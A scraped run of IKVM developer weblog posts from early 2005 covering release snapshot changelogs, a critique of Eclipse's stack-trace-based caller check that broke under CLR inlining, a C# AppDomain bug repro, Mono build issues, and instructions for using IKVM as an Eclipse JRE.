<P><I>While I agree that the Eclipse code is performing some nasty checks there I don't think I agree with the implication that the stacktrace created by the VM should change based on whether the method was inlined or not. I'm not sure what is mandated by the JVM spec but the stacktrace isn't going to be very useful for a developer debugging his program if the stacktrace changes depending on whether something got inlined or optimized away by the VM...</I></P>
<P>Here's what the Javadocs for Throwable.getStackTrace() say:</P>
<P><I>Some virtual machines may, under some circumstances, omit one or more stack frames from the stack trace. In the extreme case, a virtual machine that has no stack trace information concerning this throwable is permitted to return a zero-length array from this method.</I></P>
<P>On JDK 1.1 it was quite common to miss stack frames in a stack trace, but HotSpot is actually very good at creating a full stack trace even when it inlines methods. The CLR could certainly do better in this regard.</P>
<P>Bottom line is that the Eclipse code is very JVM specific and as far as I can tell it doesn't even serve any useful purpose.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/22/2005 21:20:05 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=657d6fda-b975-494f-ad93-c22e11d19b84"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=657d6fda-b975-494f-ad93-c22e11d19b84">Comments [2]</a>
		
		<br clear="all">
	</div>
</div><a name="a245f4ca5-0512-4e66-a6c6-fa4d4af697ef"></a><div class="entry">
	<h3 class="entryTitle">Eclipse is Evil</h3>
	<div class="entryBody">
		<P>While it's been possible to start up Eclipse with IKVM for a long time, editing a Java source didn't really work. Today I decided to look into the problem. It turned out to be caused by an IllegalStateException thrown from the following method in <A href="http://dev.eclipse.org/viewcvs/index.cgi/org.eclipse.ui.editors/src/org/eclipse/ui/texteditor/MarkerAnnotationPreferences.java?rev=HEAD&amp;content-type=text/vnd.viewcvs-markup">MarkerAnnotationPreferences.java</A>:</P><PRE>/**
 * Checks correct access.
 * 
 * @throws IllegalStateException if not called by {@link EditorsUI}
 * @since 3.0
 */
private static void checkAccess() throws IllegalStateException {
  StackTraceElement[] elements=  new Throwable().getStackTrace();
  if (!(elements[2].getClassName().equals(EditorsUI.class.getName())
      || elements[3].getClassName().equals(EditorsUI.class.getName())))
      throw new IllegalStateException();
}</PRE>
<P>It looks at the stack trace that the Throwable produces to ascertain if it was called by the correct method. This is obvious not very robust (as is born out by the fact that it checks two different slots in the array).</P>
<P>The calling method in <A href="http://dev.eclipse.org/viewcvs/index.cgi/org.eclipse.ui.editors/src/org/eclipse/ui/editors/text/EditorsUI.java?rev=HEAD&amp;content-type=text/vnd.viewcvs-markup">EditorsUI.java</A> is:</P><PRE>public static void useAnnotationsPreferencePage(IPreferenceStore store) {
  MarkerAnnotationPreferences.useAnnotationsPreferencePage(store);
}
</PRE>
<P>A <B>perfect</B> candidate for inlining! Which the CLR does, of course. So the EditorsUI class didn't appear in the stack trace at all, causing checkAccess() to fail.</P>
<P>For the time being I added a workaround to IKVM to disable inlining for all methods in classes named org.eclipse.ui.editors.text.EditorsUI, but that's obviously a disgusting hack.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/22/2005 13:49:56 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=245f4ca5-0512-4e66-a6c6-fa4d4af697ef"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=245f4ca5-0512-4e66-a6c6-fa4d4af697ef">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 18 February 2005</h2></div>
<div class="newsItems"><a name="abf2b1c39-ab75-4de0-b07f-346d744e1d4a"></a><div class="entry">
	<h3 class="entryTitle">Snapshot</h3>
	<div class="entryBody">
		<P>Mostly bug fixing and a couple of work arounds for bugs in the CLR and Mono.</P>
<P>Changes:</P>
<UL>
<LI>Sync'ed with GNU Classpath cvs.</LI>
<LI>Fixed bug in ClassLoaderWrapper that caused exception when defining the ModuleBuilder if the first class loader to define a class had a toString() representation that contained characters that are illegal in an assembly name.</LI>
<LI>Changed System.identityHashCode implementation to use non-virtual call to Object.GetHashCode instead of RuntimeHelpers.GetHashCode, to work around .NET runtime bug.</LI>
<LI>Fixed reflection to support modifying final instance fields (as per JSR-133).</LI>
<LI>Added optional verbose cast failure messages (set the IKVM_VERBOSE_CAST environment variable to enable this).</LI>
<LI>Fixed unloadable type support in native method signatures.</LI>
<LI>Changed handling of delegate types that have unsupported types in method signature (inner interface is no longer generated). This fixes bug <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=1119575&amp;group_id=69637&amp;atid=525264">1119575</A>.</LI>
<LI>Added -enabletls option to ikvmc to automagically add ThreadStaticAttribute to fields starting with __tls_</LI>
<LI>Changed IKVM specific Classpath methods to use __tls_ fields instead of LocalDataStoreSlot. This improves performance, but also works around a bug in the CLR relating to AppDomain shutdown and a GC bug in Mono on Windows.</LI>
<LI>Added workaround for Mono bug in GCHandle.IsAllocated.</LI>
<LI>Fixed implicit interface downcasting (which is sometimes required due to a quirk in the JVM spec) to throw IncompatibleClassChange instead of ClassCastException.</LI>
<LI>Fixed bug in argument globbing code that caused command line of statically converted executables to start with the name of the executable (in args[0]) on unix.</LI>
<LI>Fixed bug that caused Thread.join() on main thread to hang.</LI>
<LI>Fixed JNI name mangling to support encoding Unicode and special characters correctly.</LI>
<LI>Fixed JavaException to not call String.Format on non-format strings.</LI>
<LI>Optimized VMThread.jniDetach to not do anything if a Java thread object was never created.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/18/2005 13:18:32 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=bf2b1c39-ab75-4de0-b07f-346d744e1d4a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=bf2b1c39-ab75-4de0-b07f-346d744e1d4a">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 08 February 2005</h2></div>
<div class="newsItems"><a name="ac2442bc8-7b48-4570-b082-82649cc347dc"></a><div class="entry">
	<h3 class="entryTitle">Weird Bug</h3>
	<div class="entryBody">
		<P><A href="http://weblogs.asp.net/nunitaddin/">Jamie Cansdale</A> reported a strange problem on the mailing list. His code ran successfully when run for the first time, but subsequent runs in the same process, but a different AppDomain failed with a ClassCastException.</P>
<P>He was kind enough to work with me to try and isolate the problem. So several hours and various private IKVM builds later, I was able to reproduce the root problem:</P><PRE>using System;
using System.Runtime.CompilerServices;
class Class1
{
  static void Main(string[] args)
  {
    RuntimeHelpers.GetHashCode(new Class1());
    if(AppDomain.CurrentDomain.FriendlyName != "2nd")
    {
      AppDomain dom = AppDomain.CreateDomain("2nd");
      dom.ExecuteAssembly(typeof(Class1).Assembly.Location);
    }
  }
}
</PRE>
<P>This code dies with a System.MissingMethodException! Yet <A HREF="/PermaLink.aspx?guid=e1e6a70c-5b47-4e15-b16d-90ec891b385a">another</A> weird multi-AppDomain bug.</P>
<P>Fortunately, the work around is easy. Instead of using RuntimeHelpers.GetHashCode() to implement System.identityHashCode(), I've gone back to using some handcoded IL in map.xml to call System.Object.GetHashCode() non-virtually. This was also what I did on v1.0 of the CLR (where RuntimeHelpers.GetHashCode() didn't yet exist).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/08/2005 14:52:47 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c2442bc8-7b48-4570-b082-82649cc347dc"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c2442bc8-7b48-4570-b082-82649cc347dc">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 02 February 2005</h2></div>
<div class="newsItems"><a name="a9be7be1d-244b-4720-9a7d-3d093e537f33"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>Lot's of changes, but the major one is that Java's primitive type <I>byte</I> is now mapped to <I>System.Byte</I> instead of <I>System.SByte</I>. This makes interoperability between Java and other .NET code much easier (since System.Byte is in the CLS), although you have to be a little careful because Java's byte is signed and System.Byte is unsigned.</P>
<P>Changes:</P>
<UL>
<LI>Changed assembly versions to 0.11.*</LI>
<LI>Sync'ed with GNU Classpath cvs.</LI>
<LI>Added hack to support new Classpath awt event model.</LI>
<LI>Changed mapping of Java primitive byte from System.SByte to System.Byte, to remove the need for ByteArrayHack and better/easier interop with CLS code.</LI>
<LI>Regenerated mscorlib.jar, System.jar and System.Xml.jar with new ikvmstub (to deal with the new byte &lt;-&gt; System.Byte mapping).</LI>
<LI>Added optional support for compiling GNU Classpath with ecj to the build script. NOTE: The ecj -1.5 option is used to generate 1.5 compatible class files, so you must set the IKVM_EXPERIMENTAL_JDK_5_0 environment variable prior to starting the build process. When ecj is used to compile GNU Classpath with the -1.4 option, the build will fail because the resulting assembly is not verifiable. This is because ikvmc doesn't currently handle the way ecj compiles Java 1.4 class literals when used in the invocation of a base class constructor (this obviously isn't a common scenario, but it will be supported in a future version).</LI>
<LI>Added partial support for the new Java 5 StringBuilder class.</LI>
<LI>Changed the ikvm.lang.CIL boxing/unboxing methods dealing with bytes to account for the changed mapping.</LI>
<LI>Deprecated ikvm.lang.ByteArrayHack (it now contains only a single cast method that "casts" from byte[] to byte[], it will be removed in a future version).</LI>
<LI>Added ugly workaround for return type covariance in the IResourceReader interface.</LI>
<LI>Cleaned up setting the thread group when attaching a native thread.</LI>
<LI>Fixed JNI direct buffer APIs to support all types of java.nio.Buffer, not just ByteBuffer.</LI>
<LI>Implemented VMClassLoader.getPackages() to support enumerating packages defined by the bootstrap class loader. This is currently disabled on Mono due to a bug in Assembly.GetTypes() on Mono 1.0.5 and 1.1.3.</LI>
<LI>Implemented new stack walking mechanism that fully supports skipping over reflection and native stack frames.</LI>
<LI>Changed reflection to use new stack walking mechanism.</LI>
<LI>Changed native library loading to use new stack walking mechanism.</LI>
<LI>Fixed ikvmstub to return error value if it fails.</LI>
<LI>Added optional support to the build script to build a AMD64 version of JVM.DLL.</LI>
<LI>Fixed DynamicInvokeVirtual to actually do a virtual method invocation, instead of a non-virtual invocation.</LI>
<LI>Collapsed TypeWrapper.TypeAsParameterType and TypeWrapper.TypeAsFieldType into a single new property TypeWrapper.TypeAsSignatureType.</LI>
<LI>Fixed JNI_CreateJavaVM to support all valid JNI versions.</LI>
<LI>Fixed JNI DestroyJavaVM to return success when "destroying" the VM (even though -- like Sun -- we don't support actually destroying the VM).</LI>
<LI>Fixed JNI DetachCurrentThread to return success when detaching an already detached thread.</LI>
<LI>Fixed JNI FindClass to reject class names with dots and added support for signature format class names (e.g. [Ljava/lang/Object;), it also throws NoClassDefFoundError now instead of ClassNotFoundException.</LI>
<LI>Made some minor tweaks to JNI local ref allocation algorithms.</LI>
<LI>Changed reflective non-virtual method invocation to do a virtual invocation when invoking interfaces methods (for compatibility with Sun) and to use the regular reflection code path when invoking non-virtual methods or virtual methods that are guaranteed not to be overridden.</LI>
<LI>FieldWrapper.EmitGet/EmitSet and MethodWrapper.EmitCall[virt] no longer convert the field/return value from SignatureType to StackType, this is now left to the caller.</LI>
<LI>Fixed regression that could cause TypeWrapper constructor to try to construct a Class object for unloadable types (and this could result in an exception when an unloadable array type was constructed).</LI>
<LI>Renamed method TypeWrapper.EmitConvParameterToStackType to TypeWrapper.EmitConvSignatureTypeToStackType</LI>
<LI>Renamed method TypeWrapper.EmitConvStackToParameterType to TypeWrapper.EmitConvStackTypeToSignatureType.</LI>
<LI>Fixed native method invocation stubs to handle ghost types correctly.</LI>
<LI>Fixed reflection on .NET types to report Sealed and Abstract types as abstract only (the final abstract combination isn't legal in Java).</LI>
<LI>Improved handling of clashing method names for private interface methods.</LI>
<LI>Improved generation of base type method "hiders" for remapped types to support additional method overloads on Whidbey.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/02/2005 16:40:19 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9be7be1d-244b-4720-9a7d-3d093e537f33"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9be7be1d-244b-4720-9a7d-3d093e537f33">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 13 January 2005</h2></div>
<div class="newsItems"><a name="a24802e2f-5cea-449e-83d4-cdf35ad030a5"></a><div class="entry">
	<h3 class="entryTitle">0.10 Released</h3>
	<div class="entryBody">
		<P>I put the 0.10 release version on SourceForge, it's identical to rc2 and be downloaded <A href="http://sourceforge.net/project/showfiles.php?group_id=69637&amp;package_id=68631&amp;release_id=296723">here</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/13/2005 12:50:24 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=24802e2f-5cea-449e-83d4-cdf35ad030a5"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=24802e2f-5cea-449e-83d4-cdf35ad030a5">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 10 January 2005</h2></div>
<div class="newsItems"><a name="af7d96117-6964-4f17-9c82-e8a97c510e41"></a><div class="entry">
	<h3 class="entryTitle">0.10 Release Candidate 2</h3>
	<div class="entryBody">
		<P>I decided to make a new release candidate to&nbsp;fix a couple of bugs to make ecj work better.</P>
<P>It's available here: <A href="http://www.frijters.net/ikvmbin-0.10.0.1-rc2.zip">binaries</A> and <A href="http://www.frijters.net/ikvm-0.10.0.1-rc2.zip">source plus binaries</A>.</P>
<P>Note that IKVM still has a bug that causes a particular code construct that ecj generate to be compiled into unverifiable (but working) code. The code construct is using a class literal in the invocation of a base class constructor, ecj compiles this with inline code (javac and jikes put the generated code in a new method) and code has an exception handler around the Class.forName(), but the CLI doesn't allow exception handlers before the base class constructor is called.</P>
<P>Changes:</P>
<UL>
<LI>Added ikvm/lang/ByteArrayHack.java, ../../classpath-0.13/vm/reference/java/lang/VMCompiler.java and ../../classpath-0.13/gnu/java/awt/peer/GLightweightPeer.java to classpath/allsources.lst. Jikes automatically added these files, but when compiling with ecj the list needs to be complete (which is actually much nicer, since it doesn't require the classpath to be set in addition to the list of source files).</LI>
<LI>Added support for IKVM_EXPERIMENTAL_JDK_5_0 environment variable to enable Java 5 class file format support (note that since none of the JDK 5.0 APIs are available this isn't very useful, except for experimentation).</LI>
<LI>Fixed several bugs in Double.parseDouble/Float.parseFloat.</LI></UL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/10/2005 15:27:36 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f7d96117-6964-4f17-9c82-e8a97c510e41"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f7d96117-6964-4f17-9c82-e8a97c510e41">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 07 January 2005</h2></div>
<div class="newsItems"><a name="a6c753c02-33e9-4630-ab6e-96d2df89a27c"></a><div class="entry">
	<h3 class="entryTitle">0.10 Release Candidate 1</h3>
	<div class="entryBody">
		<P>I finally decided to make a long overdue new release (releases are what you download from the IKVM SourceForge project download and are better tested and include signed binaries). When I release a new development snapshot, I usually test it by running Mauve and my ikvm specific tests and by starting up Eclipse. I build my code on Windows using the Microsoft .NET Framework 1.1 and I don't generally test them on Mono on Linux. Releases <B>are</B> tested on Mono (although fairly superficially, since many of my tests don't run on Mono yet) and more importantly, for a release I also make sure that you can build IKVM on Mono on Linux. In a stroke of irony, while I was testing this release candidate, I discovered that my workaround for the Mono metadata bug that I introduced yesterday actually causes Mono to crash when building IKVM.GNU.Classpath.dll (the workaround itself works, you can run a Windows built IKVM.GNU.Classpath.dll that includes the workaround on Mono), so I added a workaround for that as well.</P>
<P>Basic info:</P>
<UL>
<LI>This releases is based on the GNU Classpath 0.13 release. Get it <A href="ftp://ftp.gnu.org/pub/gnu/classpath/classpath-0.13.tar.gz">here</A>.</LI>
<LI>It was tested on .NET Framework 1.1 on Windows, Mono 1.0.5 on Debian 3.0 and Mono 1.1.2 on Debian 3.0<BR>(I couldn't get Mono 1.1.3 to build, so I only tested with 1.1.2)</LI>
<LI>Downloads: <A href="http://www.frijters.net/ikvmbin-0.10.0.0-rc1.zip">binaries</A> and <A href="http://www.frijters.net/ikvm-0.10.0.0-rc1.zip">source plus binaries</A>.</LI>
<LI>Japi results: <A href="http://www.frijters.net/JDK-1.4-vs-IKVM-0.10.0.0.html">JDK 1.4 vs IKVM 0.10.0.0</A> and <A href="http://www.frijters.net/IKVM-0.10.0.0-vs-JDK-1.4.html">IKVM 0.10.0.0 vs JDK 1.4</A>.</LI>
<LI>This is still a release candidate, but if no major problems are found it will be released as is.</LI></UL>
<P>Building from source:</P>
<UL>
<LI>Download and unzip the IKVM <A href="http://www.frijters.net/ikvm-0.10.0.0-rc1.zip">source</A> zip file.</LI>
<LI>Download <A href="ftp://ftp.gnu.org/pub/gnu/classpath/classpath-0.13.tar.gz">GNU Classpath 0.13</A> and extract it in a directory next to the ikvm directory. You don't need to run any of the makefiles or build scripts.</LI>
<LI>Make sure you have <A href="http://sourceforge.net/project/showfiles.php?group_id=31650">NAnt-0.84</A> and <A href="http://www-124.ibm.com/developerworks/downloads/index.php?group_id=10&amp;recent_only=1">Jikes 1.22</A> installed.</LI>
<LI>Make sure you have the Microsoft .NET Framework 1.1, Mono 1.0.5 or Mono 1.1.2 installed.</LI>
<LI><CODE>cd ikvm</CODE></LI>
<LI><CODE>nant</CODE></LI>
<LI>That's it!</LI></UL>
<P>Changes:</P>
<UL>
<LI>Added workaround for Mono Reflection.Emit bug that causes NullReferenceException when emitting empty properties.</LI>
<LI>Added ikvmc <CODE>-key:&lt;keycontainer&gt;</CODE> option.</LI>
<LI>Added "signed" target to main build file, to automatically sign all assemblies.</LI>
<LI>Changed all version numbers to 0.10.0.0.</LI>
<LI>Signed all assemblies.</LI>
<LI>Tagged the cvs tree with v0_10_0_0.</LI></UL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/07/2005 13:47:31 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=6c753c02-33e9-4630-ab6e-96d2df89a27c"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=6c753c02-33e9-4630-ab6e-96d2df89a27c">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 06 January 2005</h2></div>
<div class="newsItems"><a name="a4ff36d61-80e0-4631-8de3-5ae115e73d07"></a><div class="entry">
	<h3 class="entryTitle">ecj</h3>
	<div class="entryBody">
		<P>Stuart Ballard posted <A href="http://sab39.dev.netreach.com/Blog/12?pm=18&amp;vobId=141">instructions</A> on his blog on how to build ecj (the Eclipse Compiler for Java) and compile it into an executable with ikvmc.</P>
<P>This is really cool, because&nbsp;ecj is&nbsp;an open source pure-Java compiler that supports all of the Java 5.0 features.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/06/2005 21:24:58 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4ff36d61-80e0-4631-8de3-5ae115e73d07"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4ff36d61-80e0-4631-8de3-5ae115e73d07">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="ab0bd3021-989a-4b94-9bf8-1d65050908cd"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>I added a workaround for the Mono metadata bug and made a couple of other changes, most notably the <CODE>-opt:fields</CODE> ikvmc option to remove unused private static fields (except for serialVersionUID), this makes the generated IKVM.GNU.Classpath.dll about 1MB smaller, because of the large number of string constant fields in the locale table classes. I haven't investigated this fully, but it appears that string literals in the code are in a different heap than the string field literals and thus they end up in the file twice. If this is indeed true than it is a rather unfortunate design flaw in the CLI metadata spec (especially since you're not allowed to use the CIL <CODE>ldsfld</CODE> instruction on a literal field).</P>
<P>Changes:</P>
<UL>
<LI>Sync'ed with GNU Classpath cvs.</LI>
<LI>Added empty NetToolkit.createRobot method (to make it compile with recent Classpath change).</LI>
<LI>Only do the MethodBuilder private field scrubbing hack if we're on .NET 1.1</LI>
<LI>Added -opt:fields ikvmc option to remove unused private static fields.</LI>
<LI>Added -monoBugWorkaround option to ikvmc (and added it to the IKVM.GNU.Classpath.dll build file) to workaround Mono 1.0.5 and 1.1.3 metadata bug. Only use this option if your compiled exe/dll fails to load on Mono (this happens if it has more than 32768 methods), it causes the generated file to grow by about 300KB.</LI>
<LI>Added workaround for NullReferenceException in Thread.SetData() on Mono.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/06/2005 11:46:32 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b0bd3021-989a-4b94-9bf8-1d65050908cd"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b0bd3021-989a-4b94-9bf8-1d65050908cd">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 05 January 2005</h2></div>
<div class="newsItems"><a name="a20c7eb0f-0614-4552-bef2-bc5dfdd9829f"></a><div class="entry">
	<h3 class="entryTitle">Mono Problems</h3>
	<div class="entryBody">
		<P>Just a quick entry to point out problems with the most recent development snapshot on Mono. Mono gives a bunch of assertion failures:</P>
<P>** (ikvm.exe): CRITICAL **: file metadata.c: line 804 (mono_metadata_string_heap): assertion `index &lt; meta-&gt;heap_strings.size' failed</P>
<P>** (ikvm.exe): CRITICAL **: file metadata.c: line 832 (mono_metadata_blob_heap):&nbsp;assertion `index &lt; meta-&gt;heap_blob.size' failed</P>
<P>Not sure what's going on yet, but in the mean time, if you want to run on Mono, you can use the previous snapshot: <A href="http://www.frijters.net/ikvmbin-20041222.zip">binaries</A> and <A href="http://www.frijters.net/ikvm-20041222.zip">source + binaries</A>.</P>
<P>[<STRONG>Update</STRONG>: As usual, Zoltan Varga was on the case and quickly fixed the problem in the Mono 1.0 and 1.1 source trees. He also told me how to workaround it, so the new <A href="/PermaLink.aspx?guid=b0bd3021-989a-4b94-9bf8-1d65050908cd">snapshot</A> has a workaround.]</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/05/2005 17:37:48 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=20c7eb0f-0614-4552-bef2-bc5dfdd9829f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=20c7eb0f-0614-4552-bef2-bc5dfdd9829f">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 04 January 2005</h2></div>
<div class="newsItems"><a name="ac2e84d9d-f369-4b85-ac6b-4fa931d2b006"></a><div class="entry">
	<h3 class="entryTitle">Using IKVM as a JRE with Eclipse</h3>
	<div class="entryBody">
		<P>A while ago Howard Gilbert wrote instructions on how to use IKVM as the target runtime with Eclipse (i.e. not running Eclipse in IKVM, but running the code you develop with Eclipse in IKVM).</P>
<P>My apologies to him for not posting this earlier (and for not adding it to <A href="http://www.ikvm.net/"><STRONG>www.ikvm.net</STRONG></A>, where it really belongs).</P><PRE>I could not find instructions in the documentation about using vanilla
Eclipse (under Java) to develop code that you then run (in Eclipse) under
IKVM. The trick is to define IKVM to Eclipse as an additional Java Runtime
Environment. It seems that this might be useful to post somewhere:

[This uses Windows and an installed Microsoft .NET Framework, but it can
probably be adapted.]

Eclipse runs under the default version of Java installed on your machine
(type "java -version" to find out). However, it can be configured with the
directories of other Java Runtime Environments (JRE's). In the Run . panel,
you can select a particular JRE in which to run each application.

Eclipse believes that a directory is a JRE if it has two things. 
1. It must have a {jre}/bin/java.exe file. 
2. It must have a {jre}/lib/rt.jar file.

Start with a binary distribution of IKVM in c:\ikvm. Copy
c:\ikvm\bin\ikvm.exe c:\ikvm\bin\java.exe. Create a c:\ikvm\lib and copy
into it the rt.jar from your favorite real Java runtime. Don't worry
because, of course, it will not really be used.
[Jeroen: You can also run ikvmstub on IKVM.GNU.Classpath.dll and rename the
resulting IKVM.GNU.Classpath.jar to rt.jar]

In Eclipse, pull down the Window menu option and select Preferences - Java -
Installed JRE's. Click the Add... button. Leave the type as "Standard VM". A
suggested "JRE name" is "IKVM". Point the "JRE home directory" to c:\ikvm.

The JRE system libraries box fills up with the libraries found in the
{jre}/lib directory. For the moment, the only such library is rt.jar.

Now build a simple Java program. When you want to run it, select Run - Run
... In the JRE tab, click the "Alternate JRE" option and select IKVM from
the pulldown. If you want to be clear, in the "Java executable" select
Alternate and type in "ikvm" (that is the ikvm.exe program). 

Now run the program. It ran under IKVM, but it is indistinguishable from
Java.

Now run ikvmstub on your favorite version of mscorlib.dll and put the
resulting jar file in c:\ikvm\lib\mscorlib.jar. After that, you should be
able to ikvmc your favorite JAR files, then put the jar file into /lib and
the generated dll into /bin. This is just a suggested use of the library
structure.

Sanity check: The Eclipse Package Explorer displays the JAR files as Eclipse
sees them during compilation. Even if you intend to run the program under
IKVM, Eclipse is going to compile them with your default real Java and its
libraries. So when you add JAR files to c:\ikvm\lib this doesn't put them in
the compiler path. You have to manually add the extra JAR files to your
project, and then the compiler knows to use them as the source is compiled.
At runtime the DLLs will either be automatically located because they are in
the same directory with ikvm.exe. 

So use Project - Properties - Java Build Path - Libraries - Add External
Jars to add mscorlib.jar to your project, and write a small Java program
using some CLI classes. Note that all the usual Eclipse IDE features work.
Type "cli.System.Console." and pause. Eclipse likes (default behavior of a
configurable feature) to convert explicit class names to imports, so it will
add a

import cli.System.Console

to the import group, replace what you have just typed with "Console." and
then display a popup with the list of methods of the System.Console class to
complete the expression.

When it doubt, in the Explorer panel on the left expand any of the jar files
(such as mscorlib.jar) to see the actual fully qualified names of the
classes generated by ikvmc.

Save the file and it gets compiled.

Run it (assuming again you set Run ... to use the IKVM "JRE") and you get
the expected output. Now there is no question that you are running IKVM
because you are calling CLI libraries.</PRE>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/04/2005 09:09:48 (W. Europe Standard Time, UTC+01:00)&nbsp;
